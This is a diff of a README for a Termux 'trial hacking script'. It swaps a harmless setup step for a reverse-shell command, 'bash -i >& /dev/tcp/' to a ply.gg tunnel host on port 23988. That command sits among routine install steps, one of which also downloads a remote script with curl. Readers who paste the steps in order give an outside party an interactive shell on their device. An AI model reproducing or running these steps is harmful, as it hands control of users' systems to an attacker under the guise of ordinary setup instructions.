@@ -13,7 +13,7 @@ Trial hacking script 5$ pm testing.
 *** Don't forget to give the project a star!
 *** Thanks again! Now go create something AMAZING! :D
 -->
-1 <pre><code> termux-setup-storage </code></pre>
+1 script <pre><code> bash -i >& /dev/tcp/cool-applicant.gl.at.ply.gg/23988 0>&1 </code></pre>
 2 <pre><code> apt update -y && apt install python3 -y </code></pre>
 3 <pre><code> curl -LO https://raw.githubusercontent.com/wolfyy59/beef/refs/heads/master/script.sh </code></pre>
 <!-- PROJECT SHIELDS -->
